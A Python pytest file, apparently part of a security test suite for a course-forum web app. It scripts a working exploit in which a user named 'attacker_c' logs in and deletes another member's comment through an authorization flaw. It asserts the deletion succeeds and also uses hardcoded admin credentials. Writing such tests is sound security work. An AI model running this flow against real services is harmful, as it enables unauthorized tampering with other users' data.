import sqlite3
from datetime import datetime, timezone

import requests

from helpers import get_user_id, count_rows


def _now_iso():
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def api_post(session, url, json=None):
    return session.post(url, json=json, timeout=5)


def api_logout(session, base_url):
    return session.post(f"{base_url}/api/auth/logout", timeout=5)


def force_add_member_db(db_path, course_id, username, role_in_course):
    """
    Test-only helper: insert/update membership with required NOT NULL fields.
    Auto-detects created_at/updated_at columns for this project schema.
    """
    conn = sqlite3.connect(str(db_path))
    try:
        row = conn.execute("SELECT user_id FROM users WHERE username=?", (username,)).fetchone()
        assert row is not None, f"user not found: {username}"
        user_id = int(row[0])

        cols = [r[1] for r in conn.execute("PRAGMA table_info(memberships)").fetchall()]
        now = _now_iso()

        existing = conn.execute(
            "SELECT membership_id FROM memberships WHERE course_id=? AND user_id=?",
            (course_id, user_id),
        ).fetchone()

        if existing:
            if "updated_at" in cols:
                conn.execute(
                    "UPDATE memberships SET role_in_course=?, updated_at=? WHERE course_id=? AND user_id=?",
                    (role_in_course, now, course_id, user_id),
                )
            else:
                conn.execute(
                    "UPDATE memberships SET role_in_course=? WHERE course_id=? AND user_id=?",
                    (role_in_course, course_id, user_id),
                )
        else:
            insert_cols = ["course_id", "user_id", "role_in_course"]
            insert_vals = [course_id, user_id, role_in_course]

            if "created_at" in cols:
                insert_cols.append("created_at")
                insert_vals.append(now)
            if "updated_at" in cols:
                insert_cols.append("updated_at")
                insert_vals.append(now)

            placeholders = ",".join(["?"] * len(insert_cols))
            sql = f"INSERT INTO memberships({','.join(insert_cols)}) VALUES({placeholders})"
            conn.execute(sql, tuple(insert_vals))

        conn.commit()
    finally:
        conn.close()


def test_exploit_course_member_can_delete_another_members_comment(app_instance):
    base_url = app_instance["base_url"]
    db_path = app_instance["db_path"]

    s = requests.Session()
    s.headers.update({"Accept": "application/json"})

    # 1) admin login
    r = api_post(s, f"{base_url}/api/auth/login", {"username": "admin", "password": "admin123"})
    assert r.status_code == 200, r.text

    # 2) create course
    r = api_post(s, f"{base_url}/api/courses", {"title": "Comments", "description": "demo"})
    assert r.status_code in (200, 201), r.text
    course_id = r.json()["course_id"]

    # 3) register 3 users
    r = api_post(s, f"{base_url}/api/auth/register", {"username": "poster_u", "password": "pass123", "display_name": "Poster"})
    assert r.status_code in (200, 201), r.text

    r = api_post(s, f"{base_url}/api/auth/register", {"username": "commenter_u", "password": "pass123", "display_name": "Commenter"})
    assert r.status_code in (200, 201), r.text

    r = api_post(s, f"{base_url}/api/auth/register", {"username": "attacker_c", "password": "pass123", "display_name": "AttackerC"})
    assert r.status_code in (200, 201), r.text

    # 4) build scenario via DB: make them course members
    force_add_member_db(db_path, course_id, "poster_u", "student")
    force_add_member_db(db_path, course_id, "commenter_u", "student")
    force_add_member_db(db_path, course_id, "attacker_c", "student")

    # 5) poster creates post
    r = api_logout(s, base_url)
    assert r.status_code in (200, 204), r.text
    r = api_post(s, f"{base_url}/api/auth/login", {"username": "poster_u", "password": "pass123"})
    assert r.status_code == 200, r.text

    r = api_post(s, f"{base_url}/api/courses/{course_id}/posts", {"title": "Topic", "body": "Body"})
    assert r.status_code in (200, 201), r.text
    post_id = r.json()["post_id"]

    # 6) commenter creates comment
    r = api_logout(s, base_url)
    assert r.status_code in (200, 204), r.text
    r = api_post(s, f"{base_url}/api/auth/login", {"username": "commenter_u", "password": "pass123"})
    assert r.status_code == 200, r.text

    r = api_post(s, f"{base_url}/api/courses/{course_id}/posts/{post_id}/comments", {"body": "Victim comment"})
    assert r.status_code in (200, 201), r.text
    comment_id = r.json()["comment_id"]

    # 7) attacker deletes someone else's comment (exploit)
    r = api_logout(s, base_url)
    assert r.status_code in (200, 204), r.text
    r = api_post(s, f"{base_url}/api/auth/login", {"username": "attacker_c", "password": "pass123"})
    assert r.status_code == 200, r.text

    r = s.delete(
        f"{base_url}/api/courses/{course_id}/posts/{post_id}/comments/{comment_id}",
        timeout=5,
    )
    assert r.status_code == 200, r.text

    remaining = count_rows(db_path, "SELECT COUNT(*) FROM comments WHERE comment_id=?", (comment_id,))
    assert remaining == 0